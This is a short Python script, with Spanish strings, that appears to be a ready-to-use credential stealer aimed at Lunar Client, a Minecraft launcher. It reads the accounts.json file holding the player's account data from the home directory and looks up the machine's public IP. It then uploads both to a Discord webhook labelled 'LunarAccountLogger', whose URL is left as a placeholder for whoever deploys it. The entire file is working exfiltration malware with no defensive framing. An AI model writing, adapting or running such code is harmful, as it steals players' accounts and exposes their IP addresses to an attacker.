import requests
from pathlib import Path
import socket
import json

WEBHOOK_URL = "pon tu webhook de discord aquí"

def find_accounts_json():
    path = Path.home() / ".lunarclient" / "settings" / "game" / "accounts.json"
    return path if path.exists() else None

def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=text', timeout=5)
        if response.status_code == 200:
            return response.text.strip()
    except:
        pass
    return "IP no encontrada"

def send_file_with_ip(filepath, ip):
    with open(filepath, 'rb') as f:
        files = {
            "file": ("accounts.json", f, "application/json")
        }
        data = {
            "username": "LunarAccountLogger",
            "content": f"🌐 IP pública del equipo: `{ip}`"
        }
        response = requests.post(WEBHOOK_URL, data=data, files=files)
        print(f"Webhook status: {response.status_code}")
        if response.status_code != 204:
            print(f"Respuesta: {response.text}")

def main():
    path = find_accounts_json()
    if not path:
        print("No se encontró el archivo accounts.json")
        return

    ip = get_public_ip()
    send_file_with_ip(path, ip)

if __name__ == "__main__":
    main()
